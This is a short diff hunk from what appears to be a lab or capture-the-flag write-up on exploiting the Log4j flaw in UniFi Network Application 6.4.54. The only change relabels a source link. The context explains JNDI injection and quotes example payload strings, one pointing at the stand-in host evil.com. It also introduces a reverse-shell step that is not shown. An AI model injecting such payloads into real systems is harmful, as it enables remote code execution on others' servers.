@@ -49,7 +49,7 @@ We found that UniFi Network Application version 6.4.54 is critically vulnerable 
 
 Log4j is a Java logging library, it records events like "user X tried to log in" to a log file. The vulnerability is that Log4j would **interpret** certain strings instead of just logging them. Specifically, if you put `${jndi:ldap://your-ip/payload}` anywhere that gets logged (like a username field, a header, etc.), Log4j would actually **reach out to your server via LDAP** and potentially **execute whatever it finds there**. So instead of logging "login attempt from user `${jndi:ldap://evil.com/x}`", it would connect to `evil.com` and run code — all automatically, with no further interaction needed.
 #### 4) Reverse shell
-[log4j-on-the-fire-unifi](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi)
+Method found on: [log4j-on-the-fire-unifi](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi)
 
 Using the method found, we can get a reverse shell:
 **Clone and build rogue-jndi:**
